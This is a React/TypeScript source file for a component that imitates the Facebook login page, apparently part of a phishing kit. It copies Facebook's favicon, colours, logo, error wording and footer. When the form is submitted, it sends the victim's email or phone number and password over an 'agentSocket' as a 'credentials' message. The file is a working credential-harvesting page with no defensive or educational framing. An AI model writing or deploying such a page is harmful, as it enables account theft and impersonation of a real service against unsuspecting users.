import { Button, createTheme, Divider, Grid, Link, Paper, TextField, ThemeProvider, Typography, useMediaQuery } from "@mui/material";
import {
  LoadingButton,
} from "@mui/lab";
import { FC, useEffect, useState } from "react";
import { useFavicon, useTitle } from "react-use";
import { FacebookIconSvg } from "../images";
import { AgentTemplateProps } from "../types";
import '../fonts/SFPRODISPLAYREGULAR.OTF';
import './facebook.template.css';

export const FacebookTemplate: FC<AgentTemplateProps> = ({ title, agentSocket }) => {
  useTitle(title || document.title || "Facebook");
  useFavicon('https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico');
  const theme = createTheme({
    palette: {
      primary: {
        main: "#1877f2",
      },
      success: {
        main: '#42b72a',
        dark: '#36a420',
      }
    },
    typography: {
      fontSize: 22,
      fontFamily: "SFProDisplay-Regular, Helvetica, Arial, sans-serif",
    },
    shape: {
      borderRadius: 8,
    }
  });
  const [emailOrPhone, setEmailOrPhone] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!emailOrPhone || !password) {
      setError(true);
      return;
    }
    agentSocket.next({ type: 'credentials', payload: { type: 'facebook', emailOrPhone, password } });
  }
  useEffect(() => {
    setError(false);
  }, [emailOrPhone, password]);
  const bigScreen = useMediaQuery(theme.breakpoints.up('lg'));
  return <ThemeProvider theme={theme}>
    <Grid container sx={{ background: '#f0f2f5', height: '115vh' }} spacing={2}>
      <Grid item xs={12}>
        <Grid container spacing={2} sx={{ p: bigScreen ? 24 : 0, px: bigScreen ? 30 : 24 }} direction={bigScreen ? 'row' : 'column'} justifyContent="center" alignItems='center'>
          <Grid item xs={7} sx={{ p: bigScreen ? 4 : 0, mb: bigScreen ? 25 : 4, mt: bigScreen ? 0 : 4 }}>
            <img alt='logo' height={200} width={400} src={FacebookIconSvg} style={{ margin: -40, marginLeft: 'auto', marginRight: 'auto', aspectRatio: '200:400' }} />
            <Typography sx={{ fontSize: bigScreen ? 38 : 30, lineHeight: '45px', width: 'auto' }} variant='h2'>Facebook helps you connect and share with the people in your life.</Typography>
          </Grid>
          <Grid item xs={5}>
            <Paper sx={{ p: 3 }} elevation={4}>
              <form onSubmit={handleSubmit}>
                <TextField
                  fullWidth
                  error={error}
                  helperText={error ? "The email address or mobile number you entered isn't connected to an account. Find your account and log in." : ''}
                  placeholder='Email address or phone number'
                  value={emailOrPhone}
                  InputProps={{
                    sx: {
                      px: 1
                    }
                  }}
                  onChange={e => setEmailOrPhone(e.target.value)} />
                <TextField
                  fullWidth
                  placeholder='Password'
                  value={password}
                  type='password'
                  sx={{ mt: 2 }}
                  InputProps={{
                    sx: {
                      px: 1
                    }
                  }}
                  onChange={e => setPassword(e.target.value)} />
                <LoadingButton type='submit' variant='contained' fullWidth sx={{ mt: 2, p: 1.5, textTransform: 'none', fontSize: 26, fontWeight: 'bold' }}>Log In</LoadingButton>
                <Link
                  sx={{
                    mt: 2.5,
                    textAlign: 'center',
                    display: 'block',
                    fontSize: 20,
                    cursor: 'pointer',
                    textDecoration: 'none',
                    '&:hover': {
                      textDecoration: 'underline'
                    }
                  }}>Forgotten password?</Link>
                <Divider sx={{ my: 4 }} />
                <Grid container direction='column' justifyContent="center" alignItems='center' spacing={2}>
                  <Grid item xs={12}>
                    <Button
                      variant='contained'
                      color='success'
                      sx={{
                        color: 'white',
                        bgcolor: 'success.main',
                        textTransform: 'none',
                        fontWeight: 'bold',
                        p: 2.3,
                        py: 1.5,
                        mb: 1
                      }}>Create New Account</Button>
                  </Grid>
                </Grid>
              </form>
            </Paper>
            <Typography sx={{ fontSize: 18, textAlign: 'center', mt: 5, display: 'block' }}><b>Create a Page</b> for a celebrity, brand or business.</Typography>
          </Grid>
        </Grid>
      </Grid>
    </Grid>
    <Grid container spacing={bigScreen ? 2 : 1.5} sx={{ py: bigScreen ? 3 : 2, px: bigScreen ? 23 : 6, mt: 1 }}>
      <Grid item xs={12} container spacing={1}>
        {[
          'English (UK)',
          'العربية',
          'Français (France)',
          'Türkçe',
          'Español',
          'Italiano',
          'বাংলা',
          'Deutsch',
          'Afrikaans',
          'Português (Brasil)',
          'हिन्दी'
        ].map((language, index) => <Grid item><Typography key={index} sx={{ fontSize: 17, textAlign: 'center', display: 'inline', mr: 1, color: '#8a8d91' }} noWrap>{language}</Typography></Grid>)}
      </Grid>
      <Grid item xs={12}>
        <Divider />
      </Grid>
      <Grid item xs={12}>
        {[
          'Sign Up',
          'Log In',
          'Messenger',
          'Facebook Lite',
          'Watch',
          'Places',
          'Games',
          'Marketplace',
          'Facebook Pay',
          'Oculus',
          'Portal',
          'Instagram',
          'Bulletin',
          'Local',
          'Fundraisers',
          'Services',
          'Voting Information Centre',
          'Groups',
          'About',
          'Create ad',
          'Create Page',
          'Developers',
          'Careers',
          'Privacy',
          'Cookies',
          'AdChoices',
          'Terms',
          'Help',
          'Contact uploading and non-users',
        ].map((language, index) => <Typography key={index} sx={{ fontSize: 16, textAlign: 'center', display: 'inline-block', mr: 3.5, color: '#8a8d91' }}>{language}</Typography>)}
      </Grid>
      <Grid item xs={12} mt={bigScreen ? 1 : 2.5} p={1}>
        <Typography sx={{ fontSize: 16, color: '#8a8d91' }}>Meta © 2022</Typography>
      </Grid>
    </Grid>
  </ThemeProvider>;
}
